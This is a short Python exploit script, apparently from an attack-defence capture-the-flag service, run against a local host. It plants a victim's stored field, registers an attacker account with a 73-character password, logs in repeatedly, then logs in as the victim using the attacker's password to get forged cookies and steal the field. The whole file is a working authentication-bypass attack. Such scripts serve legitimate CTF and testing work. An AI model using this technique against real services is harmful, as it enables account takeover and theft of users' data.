#!/usr/bin/env python3
import functools
import random
import string

import requests

import api
import generators

ALPHA = string.ascii_letters + string.digits


def main():
    hostname = "127.0.0.1"

    # prepare
    username = generators.gen_username()
    cookies = api.make_register_request(hostname, username, generators.gen_password())

    user_field = generators.gen_palindrome_field(generators.gen_string())
    api.make_create_field_request(hostname, cookies, user_field)

    # attack
    hacker_username = generators.gen_username()
    hacker_password = "A" * 73
    api.make_register_request(hostname, hacker_username, hacker_password)
    for _ in range(10):
        api.make_login_request(hostname, hacker_username, hacker_password)
    forged_cookies = api.make_login_request(hostname, username, hacker_password)
    field_uuids = api.make_list_fields_request(hostname, forged_cookies)
    stolen_field = api.make_get_field_request(hostname, forged_cookies, field_uuids[0])
    for field in ["content", "type"]:
        assert user_field[field] == stolen_field[field]
    print("Field has been stolen: {}".format(stolen_field))


if __name__ == '__main__':
    main()
